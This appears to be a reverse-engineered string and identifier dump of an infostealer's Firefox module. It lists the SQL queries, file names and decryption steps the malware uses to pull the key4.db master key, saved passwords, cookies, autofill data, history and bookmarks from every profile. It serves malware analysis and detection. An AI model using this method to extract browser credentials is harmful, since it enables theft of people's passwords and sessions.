"""
SilentNet Infostealer - Decompiled Module
Module: .app.handlers.firefox
Chunk size: 7966 bytes
String constants: 107 unicode, 380 identifiers

# Firefox credential extraction
# Original path: app/handlers/firefox.py
"""

# ============================================================
# RECONSTRUCTED FROM NUITKA CONSTANT POOL
# Method: Rolling XOR + substitution cipher decryption
# All string literals, SQL queries, paths, and identifiers
# are authentic - extracted directly from compiled binary.
# ============================================================

# --- STRING CONSTANTS (in order of appearance) ---

'Find OID position in data.'
# identifier: offset
# identifier: length
'Parse ASN.1 length. Returns (length, header_size).'
# identifier: _parse_asn1_length
'Extract OCTET STRING at exact offset. Returns (content, next_offset).'
# identifier: value
# identifier: content_start
'Extract INTEGER at exact offset. Returns (value, next_offset).'
'Find next occurrence of tag starting from offset.'
# identifier: FIREFOX_PROFILES_PATH
# identifier: join
# identifier: profiles
'Get all Firefox profile directories.'
# identifier: _find_oid
# identifier: OID_AES256_CBC
# identifier: OID_PBKDF2
# identifier: _find_next_tag
# identifier: _extract_octet_string_at
# identifier: _extract_integer_at
# identifier: OID_DES_EDE3_CBC
# identifier: idx
# identifier: encrypted_blob
# identifier: ciphertext
# identifier: hashlib
# identifier: sha1
# identifier: digest
# identifier: PBKDF2
# identifier: SHA256
# identifier: dkLen
# identifier: count
# identifier: hmac_hash_module
# identifier: iv
# identifier: ljust
# identifier: AES
# identifier: new
# identifier: MODE_CBC
# identifier: DES3
# identifier: decrypt
# identifier: LoggingManager
# identifier: add
# identifier: _MODULE
'PBES2 decrypt failed'
# identifier: LogType
# identifier: ERROR
'Decrypt PBES2 encrypted data.'
# identifier: get_temp_copy
'firefox.exe'
# identifier: suffix
'.db'
'Failed to copy key4.db'
'profile='
# identifier: sqlite3
# identifier: connect
# identifier: cursor
# identifier: execute
"SELECT item1 FROM metadata WHERE id = 'password'"
# identifier: fetchone
'SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL ORDER BY length(a11) DESC'
# identifier: close
'No master key in nssPrivate'
# identifier: WARN
# identifier: _decrypt_pbes2
'Master key decryption failed'
'Master key extracted'
# identifier: INFO
' alg='
'AES-256'
'3DES'
' key_len='
# identifier: DecryptionContext
# identifier: key
# identifier: is_aes
'key4.db extraction failed'
' error='
# identifier: unlink
'Extract and decrypt the master key from key4.db.'
# identifier: key
# identifier: base64
# identifier: b64decode
# identifier: decoded
# identifier: decode
'utf-8'
# identifier: ignore
# identifier: errors
# identifier: rstrip
'Login decryption failed'
# identifier: DEBUG
'Decrypt a single encrypted login field.'
'logins.json'
'key4.db'
# identifier: _extract_master_key
# identifier: __enter__
# identifier: __exit__
# identifier: json
# identifier: load
# identifier: logins_data
# identifier: get
# identifier: logins
'Login entries found'
' count='
# identifier: hostname
# identifier: encryptedUsername
# identifier: encryptedPassword
# identifier: _decrypt_login
# identifier: ctx
# identifier: passwords
# identifier: url
'N/A'
# identifier: username
# identifier: password
# identifier: browser
# identifier: Firefox
# identifier: profile
# identifier: profile_name
'Failed to parse logins.json'
'Extract passwords from a single Firefox profile.'
'cookies.sqlite'
'Failed to copy cookies.sqlite'
'SELECT host, name, value, path, expiry FROM moz_cookies'
# identifier: fetchall
'Cookie entries found'
# identifier: cookies
# identifier: hostKey
# identifier: name
# identifier: path
'Cookie extraction failed'
'Extract cookies from a single Firefox profile. Firefox cookies are NOT encrypted.'
# identifier: trace
# identifier: start
# identifier: _get_profiles
'f.pwd'
# identifier: noprof
'No Firefox profiles'
'Firefox not installed'
'Starting Firefox password extraction'
'profiles='
# identifier: _get_passwords_from_profile
# identifier: all_passwords
'Passwords extracted'
'f.pwd'
'total='
'Get passwords from all Firefox profiles.'
'f.cok'
# identifier: start
'f.cok'
# identifier: noprof
'Starting Firefox cookie extraction'
# identifier: _get_cookies_from_profile
# identifier: all_cookies
'Cookies extracted'
'f.cok'
'Firefox cookies complete'
'Get cookies from all Firefox profiles.'
'formhistory.sqlite'
# identifier: tempfile
# identifier: shutil
# identifier: mktemp
'.db'
# identifier: suffix
# identifier: copy2
'Failed to copy formhistory'
'SELECT fieldname, value FROM moz_formhistory'
'Autofill entries found'
# identifier: autofills
'Autofill extraction failed'
"Extract autofill entries from a Firefox profile's formhistory.sqlite."
'f.atf'
# identifier: start
'f.atf'
# identifier: noprof
'Starting Firefox autofill extraction'
# identifier: _get_autofills_from_profile
# identifier: all_autofills
'Autofills extracted'
'f.atf'
'Firefox autofills complete'
'Get autofill entries from all Firefox profiles.'
# identifier: datetime
# identifier: datetime
# identifier: fromtimestamp
# identifier: strftime
'%Y-%m-%d %H:%M:%S'
'Convert Firefox timestamp (microseconds since Unix epoch) to readable date.'
'places.sqlite'
'Failed to copy places.sqlite'
'# Firefox | '
' | '
' entries'
'...'
# identifier: lines
'x | '
'History extraction failed'
'SELECT id, title FROM moz_bookmarks WHERE type = 2'
# identifier: Unnamed
# identifier: folders
# identifier: Other
# identifier: bookmarks_by_folder
# identifier: append
'(No title)'
'Bookmarks extraction failed'
'Browser: Firefox'
'Profile: '
'Total Bookmarks: '
'================================================================================'
# identifier: sorted
'    '
"Extract bookmarks from a Firefox profile's places.sqlite as readable text."
'<genexpr>'
'_get_bookmarks_from_profile_file.<locals>.<genexpr>'
# identifier: files
# identifier: HitFile
# identifier: HitFileCategory
# identifier: HitFile
# identifier: HitFileCategory
# identifier: ff0
# identifier: start
# identifier: ff0
# identifier: noprof
'Starting Firefox files extraction'
# identifier: replace
# identifier: Firefox_
'_History.txt'
# identifier: BROWSER
# identifier: encode
'utf-8'
# identifier: data
'History file created'
# identifier: _get_bookmarks_from_profile_file
'_Bookmarks.txt'
'Bookmarks file created'
# identifier: ff9
'Firefox files extraction complete'
'files='
'Get history and bookmarks files from all Firefox profiles.'
# identifier: __doc__
# identifier: __file__
# identifier: origin
# identifier: has_location
# identifier: __cached__
# identifier: os
# identifier: dataclasses
# identifier: dataclass
# identifier: dataclass
'Crypto.Cipher'
# identifier: AES
# identifier: DES3
'Crypto.Protocol.KDF'
# identifier: PBKDF2
'Crypto.Hash'
# identifier: SHA256
# identifier: trace
# identifier: logging
# identifier: LoggingManager
# identifier: LogType
'util.handle_copy'
# identifier: get_temp_copy
# identifier: firefox
# identifier: environ
# identifier: APPDATA
# identifier: APPDATA
# identifier: Mozilla
# identifier: Profiles
# identifier: __module__
# identifier: __qualname__
# identifier: __annotations__
# identifier: is_aes
# identifier: data
# identifier: oid
# identifier: return
# identifier: data
# identifier: offset
# identifier: return
'ple'
# identifier: data
# identifier: offset
# identifier: return
'ple'
# identifier: data
# identifier: offset
# identifier: tag
# identifier: return
# identifier: return
# identifier: encrypted_blob
# identifier: password
# identifier: global_salt
# identifier: return
# identifier: key4_path
# identifier: return
# identifier: base64_data
# identifier: profile_path
# identifier: return
# identifier: return
# identifier: get_firefox_passwords
# identifier: get_firefox_cookies
# identifier: get_firefox_autofills
# identifier: firefox_time
# identifier: return
# identifier: profile_path
# identifier: return
# identifier: return
# identifier: get_firefox_files
'app\\handlers\\firefox.py'
# identifier: .0
# identifier: __class__
# identifier: base64_data
# identifier: ctx
# identifier: decoded
# identifier: is_aes
# identifier: oid_pos
# identifier: iv_pos
# identifier: iv
# identifier: ciphertext
# identifier: idx
# identifier: pos
# identifier: content
# identifier: next_idx
# identifier: key
# identifier: iv_final
# identifier: cipher
# identifier: decrypted
# identifier: pad_len
# identifier: password
# identifier: global_salt
# identifier: is_aes
# identifier: pbkdf2_pos
# identifier: search_pos
# identifier: salt_pos
# identifier: entry_salt
# identifier: next_pos
# identifier: iter_pos
# identifier: iterations
# identifier: iv_search_start
# identifier: iv_pos
# identifier: iv
# identifier: des_pos
# identifier: ciphertext
# identifier: idx
# identifier: pos
# identifier: content
# identifier: next_idx
# identifier: sha1_hash
# identifier: key_len
# identifier: derived_key
# identifier: iv_final
# identifier: cipher
# identifier: decrypted
# identifier: pad_len
# identifier: offset
# identifier: length
# identifier: header_size
# identifier: content_start
# identifier: value
# identifier: profile_name
# identifier: temp_db
# identifier: conn
# identifier: cursor
# identifier: row
# identifier: global_salt
# identifier: encrypted_key
# identifier: is_aes
# identifier: master_key
# identifier: offset
# identifier: length
# identifier: header_size
# identifier: content_start
# identifier: data
# identifier: offset
# identifier: tag
# identifier: data
# identifier: oid
# identifier: datetime
# identifier: unix_time
# identifier: profile_path
# identifier: autofills
# identifier: profile_name
# identifier: formhistory_path
# identifier: temp_db
# identifier: tempfile
# identifier: shutil
# identifier: cursor
# identifier: rows
# identifier: name
# identifier: value
# identifier: profile_path
# identifier: places_path
# identifier: profile_name
# identifier: temp_db
# identifier: tempfile
# identifier: shutil
# identifier: conn
# identifier: cursor
# identifier: folders
# identifier: rows
# identifier: title
# identifier: url
# identifier: parent_id
# identifier: folder_name
# identifier: lines
# identifier: total
# identifier: folder
# identifier: bookmarks
# identifier: bm
# identifier: profile_path
# identifier: cookies
# identifier: profile_name
# identifier: cookies_path
# identifier: temp_db
# identifier: conn
# identifier: cursor
# identifier: rows
# identifier: host
# identifier: name
# identifier: value
# identifier: path
# identifier: expiry
# identifier: expires_utc
# identifier: places_path
# identifier: profile_name
# identifier: temp_db
# identifier: tempfile
# identifier: shutil
# identifier: conn
# identifier: cursor
# identifier: rows
# identifier: url
# identifier: title
# identifier: visit_count
# identifier: last_visit_date
# identifier: title_str
# identifier: url_str
# identifier: visits
# identifier: time_str
# identifier: profile_path
# identifier: passwords
# identifier: profile_name
# identifier: logins_path
# identifier: key4_path
# identifier: ctx
# identifier: logins
# identifier: login
# identifier: hostname
# identifier: encrypted_username
# identifier: encrypted_password
# identifier: username
# identifier: password
# identifier: item
# identifier: profile_path
# identifier: data
# identifier: offset
# identifier: first_byte
# identifier: num_bytes
# identifier: length
# identifier: profiles
# identifier: profile_path
# identifier: autofills
# identifier: all_cookies
# identifier: profiles
# identifier: profile_path
# identifier: cookies
# identifier: HitFile
# identifier: HitFileCategory
# identifier: files
# identifier: profiles
# identifier: profile_path
# identifier: profile_name
# identifier: safe_profile_name
# identifier: history_text
# identifier: file_name
# identifier: bookmarks_text
# identifier: all_passwords
# identifier: profiles
# identifier: profile_path
# identifier: passwords
# identifier: __name__
# identifier: __spec__
